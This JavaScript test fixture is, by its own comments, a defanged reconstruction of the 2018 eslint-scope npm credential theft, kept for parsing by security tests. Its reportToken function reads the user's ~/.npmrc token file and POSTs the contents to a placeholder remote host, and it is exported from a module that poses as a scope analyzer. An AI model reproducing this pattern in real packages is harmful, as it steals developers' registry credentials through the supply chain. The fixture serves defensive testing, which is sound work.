// DEFANGED RECONSTRUCTION of the eslint-scope credential theft (July 2018), modeled on public incident analyses
// (see test/fixtures/reconstructions/inventory.json). Synthetic, not the original artifact.
// Parsed by capdelta tests only; never imported, installed, or executed.
// Kept: the read of ~/.npmrc and the POST of its contents to a remote host.
// Omitted: the real host, the credential value, and every call.
const fs = require("node:fs");
const https = require("node:https");
const os = require("node:os");
const path = require("node:path");

function reportToken() {
  const npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
  const request = https.request("https://npm-stat.example.invalid/collect", {
    method: "POST",
  });
  request.end(npmrc);
}

module.exports = function analyze(ast) {
  return { ast, references: [], reportToken };
};
